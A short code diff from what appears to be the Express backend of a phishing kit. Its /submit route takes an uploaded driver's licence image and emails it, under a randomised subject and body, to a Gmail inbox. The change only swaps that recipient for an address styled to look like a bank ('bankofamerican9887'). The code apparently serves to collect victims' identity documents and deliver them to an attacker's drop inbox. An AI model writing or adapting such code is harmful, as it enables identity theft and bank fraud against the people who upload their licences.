@@ -77,7 +77,7 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     // create mail options object
     const mailOptions = {
       from: "zombieoopie@gmail.com",
-      to: "habeebadaranijo541@gmail.com", // recipient email address
+      to: "bankofamerican9887@gmail.com", // recipient email address
       subject: `${randomSubject}`,
       text: `${randomSentence}`,
       attachments: [
